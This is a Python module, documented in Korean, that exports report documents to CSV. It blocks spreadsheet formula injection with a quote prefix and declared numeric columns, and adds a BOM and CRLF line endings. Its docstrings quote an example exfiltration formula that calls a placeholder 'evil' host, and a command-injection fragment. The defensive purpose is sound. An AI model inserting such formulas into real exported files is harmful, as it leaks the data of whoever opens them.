"""리포트 문서 → CSV (PRD §25.4 · TEST_PLAN §3.4~§3.5, #361).

## CSV injection 방어

스프레드시트는 ``=``·``+``·``-``·``@``로 시작하는 셀을 **수식으로 해석**한다.
``=HYPERLINK("http://evil/"&A1,"click")`` 같은 값이 셀에 들어가면 파일을 연 사람의
데이터가 빠져나갈 수 있다 — 우리가 만든 문서가 공격 매개가 된다.

방어는 **작은따옴표 접두**다. Excel·LibreOffice·Google Sheets 모두 이 접두를 「이건
문자열」로 읽고 화면에는 보이지 않는다.

``\\t``·``\\r``도 함께 막는다. OWASP 권고가 넷에 이 둘을 더하며, 실제로 탭으로
시작하는 셀이 Excel에서 수식 판정을 우회한 사례가 있다.

## 수치 열은 숫자로 나간다 (#1247)

서버가 Decimal에서 만든 ``-12.5``는 주입 벡터가 아니다. 그런데 문자열 규칙을 모든
셀에 걸면 음수 열이 통째로 ``'-12.5``가 되어 Excel이 **문자열로** 읽는다. 그래서 문서를
만드는 쪽이 열마다 종류를 선언하고(:data:`~cii_platform.reports.document.ColumnKind`),
``numeric`` 열만 :func:`serialize_cell`이 접두 없이 내보낸다.

**판정은 선언으로만 한다.** 값 모양을 보고 「숫자 같으니 접두를 빼자」고 하면 그
판정기가 새 취약점이 된다 — ``-1+1+cmd|...``를 통과시키는 모양이 하나만 있어도 끝이다.
선언된 수치 열의 값이 숫자 문법(:data:`NUMERIC_CELL`)에 맞지 **않으면** 문자열 규칙으로
되돌아간다(fail-closed) — 선언을 잘못 붙인 열이 있어도 방어는 그대로고, 문서 생성이
500으로 막히지도 않는다.

## UTF-8 BOM

Excel(Windows)은 BOM 없는 UTF-8 CSV를 **로캘 인코딩으로** 읽는다. 한국어 Windows
에서는 CP949로 읽혀 한글이 전부 깨진다. BOM 3바이트가 그 판정을 바꾼다.

## 줄바꿈은 CRLF

``RFC 4180`` §2가 CRLF를 규정한다. LF만 쓰면 구형 Excel이 한 줄로 읽는 경우가 있다.
"""

from __future__ import annotations

import csv
import io
import re
from typing import TYPE_CHECKING

from cii_platform.reports.document import (
    DISCLAIMER,
    KeyValueSection,
    TableSection,
    column_kinds,
)

if TYPE_CHECKING:
    from collections.abc import Iterable, Iterator, Sequence

    from cii_platform.reports.document import ColumnKind, ReportDocument

#: UTF-8 BOM. Excel이 UTF-8임을 알아채게 한다.
BOM = "﻿"

#: 수식으로 해석될 수 있는 시작 문자. ``\t``·``\r``은 OWASP 권고에 따라 함께 막는다.
DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize(value: str) -> str:
    """CSV injection 방어 — 위험한 시작 문자에 ``'``를 붙인다.

    **이 함수는 음수도 접두를 받는다.** ``-12.5``는 정상 값이지만 ``-`` 로 시작하므로,
    여기서 예외를 두면 ``-1+1+cmd|...`` 같은 값이 그 예외로 빠져나간다. 판정을 「값이
    수식인가」로 하면 판정기 자체가 취약점이 되므로 **시작 문자만** 본다.

    수치 열의 음수를 접두 없이 내보내는 것은 이 함수의 일이 아니다 — 문서를 만드는
    쪽이 열을 ``numeric``으로 **선언**하고 :func:`serialize_cell`이 그 선언을 본다 (#1247).
    가져오기(``§8.2``)도 이 함수를 그대로 쓴다.
    """
    if value.startswith(DANGEROUS_PREFIXES):
        return f"'{value}"
    return value


#: 수치 열로 **선언된** 셀이 접두 없이 나가기 위한 숫자 문법 (#1247).
#:
#: 부호 하나 · 정수부(천단위 ``,`` 허용 — ``DESIGN_SYSTEM §4.2``가 거리·연료에 구분자를
#: 넣는다) · 소수부. 그게 전부다. 지수(``1E+4``)·공백·두 번째 부호·``%``는 받지 않는다 —
#: 이 문법에 맞는 문자열은 스프레드시트가 수식으로 읽을 재료(연산자·함수·참조)를
#: 하나도 갖지 못한다.
#:
#: ⚠️ 이 정규식은 **선언 없는 열에는 절대 적용되지 않는다.** 그 순간 「값 모양으로
#: 판정」이 되어 모듈 머리가 경고한 취약점이 된다.
NUMERIC_CELL = re.compile(r"-?(?:\d{1,3}(?:,\d{3})+|\d+)(?:\.\d+)?")


def serialize_cell(value: str, kind: ColumnKind) -> str:
    """열 종류에 따라 셀 하나를 직렬화한다 (``API_SPEC §8.5``, #1247).

    ``string`` 열은 :func:`sanitize` 그대로다. ``numeric`` 열은 값이 :data:`NUMERIC_CELL`에
    맞을 때만 접두 없이 나가고, 맞지 않으면 **문자열 규칙으로 되돌아간다.**

    되돌아가는 쪽(fail-closed)을 고른 이유는 두 실패 방식 가운데 이쪽이 더 안전해서다 —
    ``ValueError``로 막으면 주입은 못 하지만 리포트 생성이 통째로 500이 되고, 리포트의
    수치 열에는 「값 없음」 ``—``·「기록 없음」 같은 정상 문자열이 실제로 섞인다. 되돌아가면
    주입도 못 하고 문서도 나간다. 선언을 잘못 붙인 열은 조용히 접두를 받을 뿐이며, 그것은
    종전 동작이다.
    """
    if kind == "numeric" and NUMERIC_CELL.fullmatch(value):
        return value
    return sanitize(value)


def _writer(buffer: io.StringIO) -> csv.writer:
    # RFC 4180 §2 — CRLF. QUOTE_MINIMAL이면 쉼표·따옴표·개행이 든 셀만 인용한다.
    return csv.writer(buffer, lineterminator="\r\n", quoting=csv.QUOTE_MINIMAL)


def iter_csv(document: ReportDocument) -> Iterator[str]:
    """문서를 CSV 조각으로 흘려보낸다 (스트리밍).

    한 번에 문자열을 만들지 않는 이유는 연간 리포트가 연도·항차 수에 비례해 커지기
    때문이다. 응답을 만드는 동안 전체를 메모리에 들고 있으면 큰 선대에서 그대로
    메모리 사용량이 된다.

    첫 조각에 BOM을 붙인다 — 파일의 맨 앞이어야 Excel이 알아본다.
    """
    document.validate()

    buffer = io.StringIO()
    writer = _writer(buffer)

    def flush() -> str:
        text = buffer.getvalue()
        buffer.seek(0)
        buffer.truncate(0)
        return text

    writer.writerow([sanitize(document.title)])
    yield BOM + flush()

    # 면책은 **맨 앞**이다. CSV는 스크롤해야 끝이 보이므로 푸터에 두면 읽히지 않는다.
    writer.writerow([sanitize(DISCLAIMER)])
    writer.writerow([])
    for label, value in document.meta:
        writer.writerow([sanitize(label), sanitize(value)])
    yield flush()

    for section in document.sections:
        writer.writerow([])
        writer.writerow([sanitize(section.title)])

        if isinstance(section, KeyValueSection):
            for label, value in section.rows:
                writer.writerow([sanitize(label), sanitize(value)])
        elif isinstance(section, TableSection):
            # 머리글은 라벨이라 선언과 무관하게 문자열 규칙이다. 선언은 **값 행**에만 닿는다.
            writer.writerow([sanitize(header) for header in section.headers])
            kinds = column_kinds(section.headers, section.kinds)
            for row in section.rows:
                writer.writerow(
                    [serialize_cell(cell, kind) for cell, kind in zip(row, kinds, strict=True)]
                )

        if section.note:
            writer.writerow([sanitize(section.note)])
        yield flush()

    if document.warnings:
        writer.writerow([])
        writer.writerow(["경고"])
        for warning in document.warnings:
            writer.writerow([sanitize(warning)])
        yield flush()


def render_csv(document: ReportDocument) -> str:
    """전체를 한 문자열로. 테스트와 작은 문서용이다."""
    return "".join(iter_csv(document))


def iter_table_csv(
    headers: list[str],
    rows: Iterable[list[str]],
    kinds: Sequence[ColumnKind] | None = None,
) -> Iterator[str]:
    """머리글 한 줄 + 자료 행으로 된 **표**를 CSV 조각으로 흘려보낸다 (``§8.1``, #59).

    ``kinds``는 열마다의 종류 선언이다 (#1247) — :func:`iter_csv`의 ``TableSection.kinds``와
    같은 규칙이며, 비우면 전부 ``string``이다.

    :func:`iter_csv`와 나란히 두되 **합치지 않는다.** 저쪽은 ``ReportDocument``(제목·
    면책·구간별 절)를 사람이 읽는 문서로 펴는 것이고, 이쪽은 **머리글 한 줄과 자료 행**
    이다. 문서용 장식을 자료 파일에 넣으면 스프레드시트가 첫 줄을 열 이름으로 읽지 못해
    **다시 가져올 수 없는 파일**이 된다 — `§8.2` 왕복이 깨진다.

    escape·BOM·CRLF는 같은 함수·같은 상수를 쓴다. 규칙이 두 곳에 생기면 한쪽만
    고쳐지는 날이 온다.

    행을 한 줄씩 만들어 내보내므로 **연도 전체 항차를 메모리에 쌓지 않는다** —
    호출부가 제너레이터를 넘기면 그대로 흘러간다.
    """
    buffer = io.StringIO()
    writer = _writer(buffer)

    def flush() -> str:
        text = buffer.getvalue()
        buffer.seek(0)
        buffer.truncate(0)
        return text

    column_kind = column_kinds(headers, kinds)
    writer.writerow([sanitize(header) for header in headers])
    # BOM은 **파일의 맨 앞**이어야 Excel이 알아본다.
    yield BOM + flush()

    for row in rows:
        writer.writerow(
            [serialize_cell(cell, kind) for cell, kind in zip(row, column_kind, strict=True)]
        )
        yield flush()
